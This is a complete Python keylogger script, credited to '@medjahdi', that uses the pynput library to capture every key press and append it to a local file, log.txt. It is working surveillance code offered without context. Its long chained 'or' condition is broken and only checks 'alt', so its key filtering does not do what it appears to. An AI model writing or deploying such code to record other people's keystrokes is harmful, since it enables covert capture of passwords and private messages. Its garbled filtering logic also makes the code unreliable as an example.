from pynput.keyboard import Listener
import string
def WriteToFile(key):
    letter = str(key)
    letter = letter.replace("'","")
    if letter == 'Key.space':
        letter = ' '

    if letter == 'Key.backspace':
        letter = ''

    if letter == 'Key.shift_r': 
        letter = ''
    
    if letter == "\\x01": 
        letter = ''
    
    if letter == 'Key.shift':
        letter = ''

    if letter == 'Key.ctrl_l':
        letter = ''

    if letter == 'Key.enter':
        letter = '\n'

    if letter ==( "alt" or "alt_gr" or "alt_l" 
    or "alt_r" or "backspace" 
    or "caps_lock" or "cmd" 
    or "cmd_l" or "cmd_r" 
    or "ctrl" or "ctrl_l" 
    or "ctrl_r" 
    or "down" or "end" 
    or "esc" or "f1" 
    or "home" or "insert" 
    or "left" or "menu" 
    or "num_lock" or "page_down" 
    or "page_up" or "pause" 
    or "print_screen" or "right" 
    or "scroll_lock" or "shift" 
    or "shift_l" or "shift_r" 
    or "tab" or "up"):
        letter = ''
    

    with open("log.txt","a") as f:
        f.write(letter)
        f.close()

with Listener(on_press=WriteToFile) as l:
    l.join()

    
#Developed by @medjahdi